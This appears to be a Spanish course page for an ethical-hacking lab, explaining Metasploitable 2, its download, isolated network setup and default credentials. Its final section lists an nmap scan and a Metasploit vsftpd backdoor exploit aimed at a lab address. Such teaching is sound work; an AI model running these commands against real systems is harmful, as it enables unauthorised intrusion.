# Metasploitable 2: máquina víctima para HE

## Qué es

**Metasploitable 2** es una máquina virtual Linux (Ubuntu 8.04, 32 bits) vulnerable a
propósito, publicada por Rapid7 (los autores de Metasploit) para practicar en un
entorno legal y controlado. Trae servicios viejos y mal configurados: vsftpd con
puerta trasera, Samba explotable, `distccd`, Tomcat con credenciales por defecto,
MySQL y PostgreSQL abiertos, UnrealIRCd troyanizado y aplicaciones web
vulnerables (DVWA, Mutillidae, phpMyAdmin).

En el curso es el **objetivo de red clásico** de HE: enumerar, identificar el
servicio, elegir el exploit, entrar y explicar qué huella deja. Complementa a los
objetivos web en Docker (TECNORIBERA, Juice Shop, DVWA), que son aplicaciones; esta es
una máquina entera.

Es de 2012: sirve para aprender el **método**, no representa un objetivo moderno.

## Descarga

Fichero oficial en SourceForge, 825 MB:

- https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download
- SHA-256: `2ae8788e95273eee87bd379a250d86ec52f286fa7fe84773a3a8f6524085a1ff`
  (MD5 `abb0a95bd4422397ed235a7284e2ed7f`, el que muestra SourceForge)
- Documentación: https://docs.rapid7.com/metasploit/metasploitable-2/

El ZIP trae un disco VMware (`Metasploitable.vmdk`, 1,9 GB) que VirtualBox usa tal
cual. Credenciales: `msfadmin` / `msfadmin`.

## Importar y conectar

No se hace a mano: [`labnet-up.sh`](../labnet-up.sh) crea la VM (512 MB, disco IDE),
la deja **solo** en la red interna `labnet` con la IP `10.10.10.13`, añade a la Kali
una tarjeta en esa red (`10.10.10.50`) y hace una instantánea limpia:

```
./labnet-up.sh preparar ~/Descargas/metasploitable-linux-2.0.0.zip
./labnet-up.sh arrancar
```

Detalle de la red y de cada orden: [LABORATORIO-VM.md](../LABORATORIO-VM.md).
Hoja del alumnado: [Prepara tu equipo para Metasploitable](../../../docs/sesiones/HE-preparar-metasploitable.md).

> **Aislamiento obligatorio.** Metasploitable está hecha para que la comprometan.
> Nunca en adaptador puente ni con NAT: solo en `labnet`. `./labnet-up.sh comprobar`
> no la deja arrancar si tiene otra tarjeta.

## Arquitectura

x86 de 32 bits. Funciona en VirtualBox sobre PC Intel/AMD (los puestos del aula). En
Mac con Apple Silicon no arranca en VirtualBox; ahí se trabaja con los objetivos
Docker.

## Primer contacto desde Kali (en clase, con el alcance por escrito)

```
nmap -sV -p- 10.10.10.13

msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.13
run
```

Lo que se evalúa no es "sacar la shell": es explicar qué servicio era vulnerable,
por qué, qué huella deja el ataque y cómo se detectaría desde el SOC.
